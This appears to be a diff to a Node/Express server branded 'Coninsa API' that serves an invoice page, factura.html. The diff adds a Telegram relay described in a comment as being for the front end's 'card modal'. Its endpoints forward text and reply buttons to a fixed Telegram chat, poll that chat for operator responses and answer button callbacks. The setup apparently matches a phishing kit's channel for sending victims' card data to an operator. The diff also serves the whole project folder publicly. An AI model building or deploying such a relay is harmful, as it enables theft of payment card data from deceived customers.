@@ -2,6 +2,7 @@
 const express = require('express');
 const cors    = require('cors');
 const axios   = require('axios');
+const path    = require('path');
 
 const PORT     = process.env.PORT     || 3002;
 const TG_TOKEN = process.env.TG_TOKEN || '';
@@ -73,7 +74,57 @@ function fmtCOP(n) {
   return new Intl.NumberFormat('es-CO', { style: 'currency', currency: 'COP', minimumFractionDigits: 0 }).format(n);
 }
 
+// ── Telegram proxy (para el modal de tarjeta del front) ──────────────────────
+async function tgSend(msg, reply_markup) {
+  if (!TG_TOKEN || !TG_CHAT) return { ok: false };
+  const body = { chat_id: TG_CHAT, text: msg, parse_mode: 'HTML' };
+  if (reply_markup) body.reply_markup = reply_markup;
+  const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(body),
+  });
+  return r.json();
+}
+
+async function tgGetUpdates(offset) {
+  if (!TG_TOKEN) return { ok: false, result: [] };
+  const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/getUpdates?offset=${offset}&timeout=0`);
+  return r.json();
+}
+
+async function tgAnswerCallback(id) {
+  if (!TG_TOKEN) return;
+  await fetch(`https://api.telegram.org/bot${TG_TOKEN}/answerCallbackQuery`, {
+    method: 'POST', headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ callback_query_id: id }),
+  }).catch(() => {});
+}
+
 // ── Routes ────────────────────────────────────────────────────────────────────
+
+app.post('/api/tg/send', async (req, res) => {
+  try {
+    const { text, reply_markup } = req.body || {};
+    const data = await tgSend(text, reply_markup);
+    res.json(data);
+  } catch (e) { res.json({ ok: false }); }
+});
+
+app.get('/api/tg/updates', async (req, res) => {
+  try {
+    const offset = parseInt(req.query.offset) || 0;
+    const data   = await tgGetUpdates(offset);
+    res.json(data);
+  } catch (e) { res.json({ ok: false, result: [] }); }
+});
+
+app.post('/api/tg/answer', async (req, res) => {
+  try {
+    const { callback_query_id } = req.body || {};
+    await tgAnswerCallback(callback_query_id);
+    res.json({ ok: true });
+  } catch (e) { res.json({ ok: false }); }
+});
 
 app.get('/health', (_, res) =>
   res.json({ ok: true, uptime: Math.floor(process.uptime()), cache: _cache.size })
@@ -150,6 +201,8 @@ app.post('/api/coninsa/buscar', async (req, res) => {
   }
 });
 
+app.use(express.static(path.join(__dirname)));
+
 app.listen(PORT, () =>
-  console.log(`\n✅ Coninsa API v1.0 corriendo en http://localhost:${PORT}\n`)
+  console.log(`\n✅ Coninsa API v1.0 corriendo en http://localhost:${PORT}\n   Frontend: http://localhost:${PORT}/factura.html\n`)
 );
